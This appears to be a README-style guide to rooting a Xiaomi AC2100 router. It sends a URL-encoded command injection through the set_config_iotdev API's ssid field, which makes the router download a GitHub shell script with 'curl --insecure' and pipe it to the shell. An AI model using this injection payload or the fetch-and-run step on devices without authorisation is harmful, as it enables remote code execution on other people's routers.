# Enable SSH access to Xiaomi AC2100 router

The factory firmware of the router is a modified OpenWRT and, as such, the built-in sshd (Dropbear) can be enabled on it.

1. Log in to your router in its web interface, default IP is 192.168.31.1
2. Take a note of the security token (\<STOK\>)
3. Use this token, replacing \<STOK\> in the URL below, to build the final URL:

`http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev%3Fbssid%3Dxiaomi%26user_id%3Dxiaomi%26ssid%3D-h%0Acurl%20--insecure%20https%3A%2F%2Fraw.githubusercontent.com%2Fvargazol%2Fxiaomi-ac2100-ssh%2Fmain%2Funlock_ssh.sh%20%7C%20ash%0A%0A`

If the command is injected and the script executed correctly, you will receive a **{"code":0}** response and the router will reboot.

Now you can connect to the router with ssh by executing `ssh root@192.168.31.1` in your terminal. The default password is _admin_. Don't forget to change it by executing "passwd" afterwards.
